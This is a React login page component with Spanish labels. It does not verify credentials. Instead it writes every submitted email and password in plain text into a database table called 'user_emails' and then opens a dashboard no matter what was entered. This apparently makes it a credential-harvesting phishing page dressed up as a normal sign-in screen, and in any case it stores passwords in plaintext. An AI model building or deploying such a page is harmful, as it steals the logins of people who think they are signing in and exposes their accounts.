import { useState } from "react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/hooks/use-toast";

export default function Login() {
  const [credentials, setCredentials] = useState({ email: "", password: "" });
  const navigate = useNavigate();
  const { toast } = useToast();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    try {
      // Save email and password to the database
      const { error } = await supabase
        .from('user_emails')
        .insert([
          { 
            email: credentials.email,
            password: credentials.password
          }
        ]);

      if (error) throw error;

      toast({
        title: "Success",
        description: "Email saved successfully",
      });

      navigate("/dashboard");
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Error",
        description: error.message,
      });
    }
  };

  return (
    <div className="min-h-screen bg-[#E8F1FF] flex items-center justify-center">
      <div className="bg-white p-8 rounded-lg shadow-lg w-full max-w-md space-y-6">
        <div className="flex justify-center">
          <img src="/lovable-uploads/0893c2ac-1331-47e8-b8c6-504c49064b2f.png" alt="Logo" className="w-16 h-16" />
        </div>
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="space-y-2">
            <Input
              type="email"
              placeholder="Correo electrónico"
              value={credentials.email}
              onChange={(e) => setCredentials({ ...credentials, email: e.target.value })}
            />
          </div>
          <div className="space-y-2">
            <Input
              type="password"
              placeholder="Contraseña"
              value={credentials.password}
              onChange={(e) => setCredentials({ ...credentials, password: e.target.value })}
            />
          </div>
          <Button type="submit" className="w-full bg-[#0F172A] hover:bg-[#1E293B]">
            Iniciar Sesión
          </Button>
        </form>
      </div>
    </div>
  );
}